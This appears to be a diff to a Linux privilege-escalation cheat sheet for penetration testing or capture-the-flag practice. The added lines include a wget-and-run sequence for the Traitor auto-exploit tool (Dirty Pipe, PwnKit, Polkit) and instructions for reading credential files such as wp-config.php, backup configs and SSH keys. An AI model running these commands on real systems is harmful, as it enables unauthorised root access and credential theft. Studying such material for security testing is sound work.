@@ -10,6 +10,8 @@ pwd
 id
 ```
 
+* **Check your groups:** Users in the **adm** group can read many files under `/var/log/` (e.g. syslog). Look for sensitive logs or misplaced files (e.g. passwords, config snippets). If you have a user password, try `su USER` to switch and re-check `id` and file access.
+* **Recent sudo use:** The file `/home/USER/.sudo_as_admin_successful` exists if that user recently used sudo successfully — indicates who may have sudo rights.
 * See what is listening internally
 
 ```
@@ -141,6 +143,19 @@ find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -ex
 find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
 ```
 
+### Automated enumeration and exploit tools
+
+* **linpeas** ([PEASS-ng/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)) — runs a broad set of checks and includes **Linux Exploit Suggester** (suggests kernel/userland CVEs with tags and download URLs). Review output for SUID, sudo, writable paths, polkit/pkexec, etc.
+* **Traitor** ([liamg/traitor](https://github.com/liamg/traitor)) — automatically exploits common misconfigurations and CVEs to get a root shell. Covers many GTFOBins-style escapes plus e.g. CVE-2022-0847 (Dirty Pipe), CVE-2021-4034 (PwnKit), CVE-2021-3560 (Polkit), and writable `docker.sock`.
+
+```bash
+wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64
+chmod +x traitor-amd64
+./traitor-amd64 -a -p
+```
+
+* Polkit (CVE-2021-3560) in Traitor may try to install packages and can fail without internet; PwnKit (CVE-2021-4034) and other local vectors often work offline.
+
 ### Weak File Permissions
 
 #### Readable shadow
@@ -241,6 +256,8 @@ cat ~/.*history | less
 #### Config Files
 
 * Config files often contain passwords in plaintext or other reversible formats.
+* **Backup and alternate config files:** Check for `.bak`, `.old`, or `-old` variants (e.g. `/etc/tomcat9/tomcat-users.xml.bak`). These often contain the same or older plaintext passwords and may be world-readable.
+* **WordPress:** If you have read access to the web root (e.g. as www-data), `cat /var/www/SITE/public_html/wp-config.php` (or similar path) for `DB_USER`, `DB_PASSWORD`, and `DB_NAME` — reuse for MySQL or lateral movement.
 * List the contents of the user's home directory:
 
 ```
@@ -262,10 +279,11 @@ su root
 #### SSH Keys
 
 * Sometimes users make backups of important files but fail to secure them with the correct permissions.
-* Look for hidden files & directories in the system root:
+* Look for hidden files and directories in the system root **and in each user's home** (e.g. `~/.config/` — files like `.config/.flag1.txt` are easy to overlook):
 
 ```
 ls -la /
+ls -la /home/*/
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
 ```
